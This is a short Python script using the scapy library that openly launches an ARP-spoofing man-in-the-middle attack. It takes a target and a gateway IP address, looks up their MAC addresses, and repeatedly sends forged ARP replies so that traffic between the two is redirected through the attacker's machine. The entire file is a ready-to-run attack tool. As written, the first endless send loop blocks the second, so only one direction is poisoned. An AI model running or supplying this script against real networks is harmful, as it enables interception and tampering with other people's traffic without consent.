import argparse
import scapy.all as scapy
import socket

parser = argparse.ArgumentParser(description='Launch a man in the midle attack.')
parser.add_argument('target', help='The IP address of the target')
parser.add_argument('gateway', help='The gateway IP address')
args = parser.parse_args()

#Get the interface ip adress
hostname = socket.gethostname()
my_ip = socket.gethostbyname(hostname)

def getMacAddress(host):
    ''' Get the host mac address
        :param: Host ip
        :return: mac address
        :rtype: str
    '''
    arp_packet = scapy.ARP(hwdst="ff:ff:ff:ff:ff:ff", psrc=my_ip, pdst=host)
    arp_response = scapy.sr1(arp_packet)
    return arp_response.hwsrc

scapy.send(scapy.ARP(op="is-at", psrc=args.gateway, pdst=args.target, hwdst=getMacAddress(args.target)), loop=1, inter=12)
scapy.send(scapy.ARP(op="is-at", psrc=args.target, pdst=args.gateway, hwdst=getMacAddress(args.gateway)), loop=1, inter=12)
